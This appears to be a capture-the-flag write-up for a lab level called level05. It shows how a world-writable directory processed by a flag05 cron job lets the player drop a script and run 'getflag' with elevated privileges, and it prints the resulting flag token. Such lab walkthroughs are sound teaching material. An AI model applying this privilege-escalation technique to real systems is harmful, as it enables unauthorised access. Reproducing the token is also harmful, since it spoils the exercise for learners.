# Level05

### 0. Login

When logging in as level05, we immediately see:

	You have new mail.

We keep this in mind but continue with the main investigation.

### 1. Identity

	$ id
	uid=2005(level05) gid=2005(level05) groups=2005(level05),100(users)

We are logged in as **level05**.

### 2. Home directory

	$ pwd
	/home/user/level05

	$ ls -la
	...

All files here are standard shell configuration files (.bashrc, .profile, etc.) with nothing exploitable.

### 3. Searching files owned by our user

	$ find / -user level05 2>/dev/null

Nothing interesting here.

Since the goal of each level is to obtain the flagXX token, we also search for files belonging to **flag05**:

	$ find / -user flag05 2>/dev/null
	/usr/sbin/openarenaserver
	/rofs/usr/sbin/openarenaserver


Two files appear, one on the live system and one on the read‑only filesystem.

### 4. Searching openarenaserver files

Let's check the files permissions :

	$ ls -l /rofs/usr/sbin/openarenaserver
	-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver

	$ ls -l /usr/sbin/openarenaserver
	-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

The version in /rofs/ is read‑only and not usable.

We focus on /usr/sbin/openarenaserver.

File content :

```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script:
- Iterates over every file inside /opt/openarenaserver/
- Executes each one with bash -x
- Deletes it afterwards

### 5. ACL of /opt/openarenaserver

Let's check the Access Control List for the **/opt/openarenaserver** directory :

	$ getfacl -d /opt/openarenaserver
	getfacl: Removing leading '/' from absolute path names
	# file: opt/openarenaserver
	# owner: root
	# group: root
	user::rwx
	user:level05:rwx
	user:flag05:rwx
	group::r-x
	mask::rwx
	other::r-x

**level05 has full rwx access to this directory.**

This means we can drop any script in /opt/openarenaserver/ and the system will execute it as **flag05** the next time the cron job (or scheduled task) runs openarenaserver.

### 6. Cron Job Execution

From the user’s mailbox:

	$ cat /var/mail/level05
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

A cron job runs every 2 minutes, executing:

	su -c "sh /usr/sbin/openarenaserver" - flag05

So **every 2 minutes**, the system runs openarenaserver as **flag05**.

Combined with our write access to /opt/openarenaserver/, this gives us a privilege escalation path.

### 7. Exploitation

To obtain the flag, we simply drop a malicious script into /opt/openarenaserver/.

	$ echo "getflag > /tmp/f05" > /opt/openarenaserver/exploit.sh
	$ chmod 755 /opt/openarenaserver/exploit.sh

Then wait for the cron job (up to 2 minutes).
It executes our script as flag05, then deletes it.

### 8. Getting the flag

After the cron job runs:

	$ cat /tmp/f05
	Check flag.Here is your token : viuaaale9huek52boumoomioc
	
This gives us the **flag05 token**.